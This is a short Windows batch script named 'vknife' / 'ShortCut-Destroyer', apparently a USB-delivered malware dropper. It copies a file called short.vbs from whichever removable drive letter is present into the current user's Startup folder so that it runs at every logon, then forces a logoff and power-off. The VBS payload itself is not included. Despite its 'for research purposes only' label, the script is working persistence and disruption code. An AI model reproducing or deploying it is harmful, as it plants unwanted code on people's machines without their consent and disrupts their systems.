REM +++++++++++++++++
REM |    vknife     |
REM +++++++++++++++++
REM
REM *~ ShortCut-Destroyer ~*
REM
REM For resarch porposes only
REM
REM Henry Samuelson, Christopher Hansen 

REM test sources, bc we dont know what the USB drive will be named by the system
xcopy /s D:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s E:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s F:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s G:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

REM this shouldnt happen but if the drive is named weird
xcopy /s A:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s B:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
REM then reboot system to run the startup applications
shutdown /l
shutdown /p

